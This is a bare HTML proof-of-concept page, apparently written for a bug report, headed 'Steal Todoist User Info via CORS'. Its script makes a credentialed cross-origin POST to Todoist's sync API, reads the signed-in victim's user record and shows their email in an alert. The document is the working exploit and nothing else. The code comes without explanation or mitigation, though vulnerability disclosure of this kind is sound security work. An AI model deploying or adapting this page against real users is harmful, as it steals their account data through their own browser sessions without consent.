<!DOCTYPE html>
<html>
  <body>
    <h2>PoC: Steal Todoist User Info via CORS</h2>

    <script>
      fetch("https://app.todoist.com/api/v1/sync", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        credentials: "include",
        body: JSON.stringify({
          resource_types: ["user"]
        })
      })
      .then(res => res.json())
      .then(data => {
        alert("User email: " + data.user.email);
      })
      .catch(err => {
        alert("Request failed: " + err.message);
        console.error(err);
      });
    </script>
  </body>
</html>
